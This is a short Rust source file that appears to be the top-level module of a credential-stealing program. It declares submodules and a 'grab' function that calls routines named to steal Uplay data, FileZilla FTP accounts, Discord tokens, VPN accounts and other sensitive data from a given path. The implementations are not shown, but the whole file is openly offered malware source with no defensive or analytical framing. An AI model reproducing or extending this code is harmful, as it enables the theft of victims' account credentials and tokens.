pub mod sensitive_data;
pub mod uplay;
pub mod filezilla;
pub mod vpn;
pub mod discord;

pub fn grab(path: String) {

    sensitive_data::grab_data(path.clone());
    uplay::steal_uplay(path.clone());
    filezilla::steal_ftp_account(path.clone());
    discord::steal_discord_token(path.clone());
    vpn::steal_vpn_accounts(path.clone());
}